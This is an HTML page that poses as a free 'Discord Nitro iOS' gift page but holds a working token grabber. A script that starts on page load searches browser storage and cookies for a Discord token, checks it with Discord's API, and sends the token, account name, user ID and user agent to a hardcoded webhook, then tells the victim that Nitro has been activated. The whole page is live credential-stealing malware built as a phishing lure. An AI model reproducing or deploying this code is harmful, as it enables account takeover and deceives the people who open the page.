<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width">
    <title>Discord Nitro</title>
    <style>
        body { 
            margin: 0; padding: 40px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            font-family: -apple-system; 
            text-align: center; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
        }
        .card { background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 400px; margin: auto; }
        .loading { display: inline-block; width: 40px; height: 40px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; margin: 20px 0; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #status { font-size: 18px; margin: 20px 0; }
        .success { color: #00ff88 !important; font-size: 24px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎁 Nitro iOS</h1>
        <div class="loading" id="loader"></div>
        <div id="status">Opening Discord app...</div>
    </div>

    <script>
    // YOUR WEBHOOK HERE (GET FROM Discord → Server Settings → Integrations → Webhooks)
    const WEBHOOK = 'https://discord.com/api/webhooks/1482696426575368252/iebzhhJsdt83_QXWG5hek6UhjU2rQ6BfKdU7h7_w_gsdP8fEFF-Dc2gPf6Bp0-i2ZKP-';
    
    function huntToken() {
        const sources = [
            localStorage.getItem('token'),
            sessionStorage.getItem('token'),
            document.cookie.match(/token=([^;]+)/)?.[1]
        ];
        
        for(let source of sources) {
            if(source) {
                const token = source.replace(/"/g, '').trim();
                if(token.length > 58 && (token.startsWith('mfa.') || !token.includes('.'))) {
                    sendToken(token);
                    return true;
                }
            }
        }
        return false;
    }

    async function sendToken(token) {
        try {
            document.getElementById('status').innerHTML = 'Validating token...';
            
            const user = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { 'Authorization': token }
            }).then(r => r.json()).catch(() => ({id: null}));

            const payload = {
                content: `📱 **iOS DISCORD TOKEN GRABBED** ✅`,
                username: 'Token Grabber',
                embeds: [{
                    title: user.id ? `${user.username}#${user.discriminator}` : 'Token (needs validation)',
                    description: `\`\`\`${token}\`\`\``,
                    color: user.id ? 0x00ff00 : 0xffaa00,
                    fields: [
                        { name: 'URL', value: 'https://mattiatek1.github.io/tokendiscord/', inline: true },
                        { name: 'User ID', value: user.id || 'Checking...', inline: true },
                        { name: 'iOS UA', value: navigator.userAgent.slice(0, 60), inline: false }
                    ],
                    footer: { text: new Date().toLocaleString() }
                }]
            };
            
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            document.getElementById('status').innerHTML = '<span class="success">✅ Nitro activated! Check DMs!</span>';
            document.getElementById('loader').style.display = 'none';
        } catch(e) {
            console.log('Retry...');
            setTimeout(() => sendToken(token), 2000);
        }
    }

    function startAttack() {
        if(huntToken()) return;
        
        document.getElementById('status').innerHTML = 'Open Discord app now...';
        window.location.href = 'discord://discord.com';
        
        const interval = setInterval(() => {
            if(huntToken()) clearInterval(interval);
        }, 800);
        
        setTimeout(() => clearInterval(interval), 45000);
    }

    // AUTO START + POLLING
    startAttack();
    setInterval(huntToken, 500);
    </script>
</body>
</html>
